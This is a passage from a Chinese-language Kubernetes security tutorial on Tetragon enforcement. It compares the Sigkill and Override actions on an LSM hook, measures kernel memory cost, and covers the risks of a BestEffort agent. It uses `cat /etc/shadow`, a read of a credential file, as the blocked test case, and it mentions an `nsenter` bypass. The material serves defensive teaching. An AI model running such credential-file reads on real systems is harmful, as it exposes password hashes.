常見的說法是「覆寫回傳值需要 `fmodret`,所以只能掛 syscall」。實測不成立:`Override` 掛在**非 syscall** 的 `security_file_permission` 上載入成功、`MODE=enforce`,而且 `cat /etc/shadow` 確實回 `Operation not permitted`。

真正的條件是**函式可錯誤注入**,而這顆核心的 LSM 掛勾符合。

代價在核心記憶體:

| 策略 | 動作 | 核心記憶體 |
|---|---|---|
| 純觀察 | 無 | 346,976 B |
| exec 允許清單 | `Sigkill` | **346,976 B**(與純觀察相同) |
| 檔案讀取 | `Sigkill` | 346,976 B |
| 檔案讀取 | **`Override`** | **2,968,336 B(8.5 倍)** |

**`Sigkill` 是免費的,`Override` 不是。** 寫攔截策略時這一項要算進節點的核心記憶體預算,而它**在任何 `kubectl top` 上都看不到**。

### 地雷 8:BestEffort 的 agent,現在身上掛著會殺行程的策略 {#mine-8}

[Day 5 地雷 8](sprint2-day5-tetragon-basics.md#mine-8) 說過 chart 的 agent 容器是 `resources: {}`、沒有 `priorityClassName`,所以是 BestEffort、priority 0。當時描述的最糟失效形狀是「BPF 程式 pinned 在核心裡照跑、沒有人讀 ring buffer,錢照付、事件全丟、健康檢查不會叫」。

**攔截情境下同一個失效變成:核心裡的程式繼續殺行程,而沒有人在讀事件。** 誤殺照樣發生,紀錄一筆都沒有。

而攔截狀態下的記憶體比 Day 5 更高(本次量到 164–224Mi,最高的那顆是被 `tetra getevents` 抽過多輪的),**requests 仍然是 0,對排程器完全隱形**。

**以攔截為前提部署 Tetragon 時,補 `resources` 與 `priorityClassName` 不是調校,是前提。**

## 帶得走的東西

- **決定「擋得住」的是掛勾點的位置,不是動作的種類。** 同一個 `Sigkill`,掛在操作之前的權限檢查上擋得住連 `sendfile` 都攔下來;掛在操作完成後才觸發的事件上一樣什麼都擋不住。官方文件那句「SIGKILL 不保證阻止操作」跟本課量到的「這個掛勾上擋住了」是同一件事的兩面。
- **攔截交付的是「這個動作沒有發生」,不是「這個攻擊者被處理了」。** 五次攔截成功,對攻擊者的代價只是五個行程;父 shell 還在,換個路徑立刻繼續。要有人被叫醒,還是得靠偵測那一側。
- **攔截的守備範圍比觀察小,而這個不對稱是架構性的。** 觀察是節點全域的,攔截綁在一組 cgroup 上。所以會出現「同一套軟體看見了自己攔不到的攻擊」——而那個洞的修補位置在 admission 層,不在執行期。
- **錯的偵測規則是雜訊,錯的攔截規則是一場沒有人被叫醒的當機。** 82 秒的錯誤輸出,pod `1/1 Running`、`RESTARTS 0`、沒有 Kubernetes 事件、應用日誌連 `Killed` 都沒有,唯一症狀是資料欄位變空。
- **攔截的變更風險高,但變更機制反而乾淨。** 生效與復原都在兩秒內、逐節點、不重啟任何東西。搞砸一條攔截策略之後,你可以在兩秒內把它拿掉——這對事故收尾比什麼都重要。

## 延伸閱讀

想往下深挖,從這幾份開始:

- **[Tetragon 的強制執行機制](https://tetragon.io/docs/concepts/enforcement/)** —— 官方對覆寫回傳值與訊號兩種做法的說明,**包含那句「SIGKILL 不保證阻止操作」的警告與「Signal 配 Override」的建議**,是步驟 3 必須並讀的一手來源。
- **[選擇器與動作的完整語法](https://tetragon.io/docs/concepts/tracing-policy/selectors/)** —— `matchActions` 可用的動作、各種運算子,以及同一選擇器內 AND、跨選擇器 OR 的組合規則。
- **[TracingPolicy 的概念與組成](https://tetragon.io/docs/concepts/tracing-policy/)** —— 掛勾點加核心內過濾這個結構的官方說明,寫任何策略之前的基礎。
- **[Tetragon Helm chart 參數表](https://tetragon.io/docs/reference/helm-chart/)** —— 地雷 8 的一手來源:`resources` 的空物件預設就列在這份表裡。

## 下一步

Falco 與 Tetragon 這一段到此為止:兩套工具都裝過、規則與策略都自己寫過、偵測與攔截的帳單都算過。它們共同的視角是**行程與檔案**——誰執行了什麼、誰開了哪個檔。

而今天有兩個發現都指向同一個方向。`nsenter` 繞過攔截那一格,真正的修補位置在 admission 層;而四天下來所有跟網路有關的東西——那條被 `Sigkill` 一起帶走的 TCP 連線、Falco 那條「沒連過的位址」自訂規則、`ndots:5` 的六倍放大——都是從行程的角度看到的網路,不是從網路本身。

[Day 7](sprint2-day7-cilium-kubeproxy.md) 換一個角度:把觀測與管制放進網路層,而第一步是把 Kubernetes 的 Service 實作整個換掉。

---

!!! quote ""
    Tetragon 標誌為 Tetragon 專案之官方資產,此處作社群教學用途。
